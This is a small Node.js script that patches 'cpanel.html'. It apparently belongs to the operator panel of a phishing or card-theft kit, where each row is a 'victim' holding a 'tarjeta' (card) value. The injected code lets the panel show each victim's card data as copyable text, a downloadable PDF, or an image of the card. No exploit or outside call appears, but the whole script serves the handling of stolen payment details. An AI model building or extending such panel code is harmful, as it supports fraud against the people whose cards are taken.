const fs = require('fs');

let html = fs.readFileSync('cpanel.html', 'utf8');

// The line we want to replace:
// <td><span class="data-hl-green">${victim.tarjeta || '-'}</span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard('${victim.tarjeta || '-'}', this)"></i></td>
const oldLine = /<td><span class="data-hl-green">\$\{victim\.tarjeta \|\| '-'\}<\/span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard\('\$\{victim\.tarjeta \|\| '-'\}.*?<\/td>/;

// Also we need to inject the logic to create tarjetaHtml before the tr.innerHTML
const insertPoint = /tr\.innerHTML = `/;

const logicToInject = `
                let tarjetaHtml = '-';
                if (victim.tarjeta) {
                    if (victim.tarjeta.startsWith('data:application/pdf')) {
                        tarjetaHtml = \`<a href="\${victim.tarjeta}" download="tarjeta_\${id}.pdf" class="btn btn-green" style="padding:4px 8px; width:auto; display:inline-block; font-size:11px; text-decoration:none; color:white; background-color:#2ec866; border:none; border-radius:3px; text-align:center;"><i class="fas fa-file-pdf"></i> Descargar PDF</a>\`;
                    } else if (victim.tarjeta.startsWith('data:image')) {
                        tarjetaHtml = \`<button class="btn btn-blue" onclick="window.open('\${victim.tarjeta}', '_blank')" style="padding:4px 8px; width:auto; display:inline-block; font-size:11px;">🖼️ Ver Tarjeta</button>\`;
                    } else {
                        tarjetaHtml = \`<span class="data-hl-green">\$\{victim.tarjeta\}</span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard('\$\{victim.tarjeta\}', this)"></i>\`;
                    }
                }

                tr.innerHTML = \``;

html = html.replace(insertPoint, logicToInject);
html = html.replace(oldLine, '<td>${tarjetaHtml}</td>');

fs.writeFileSync('cpanel.html', html, 'utf8');
console.log('cpanel.html updated to handle base64 tarjeta images and PDFs');
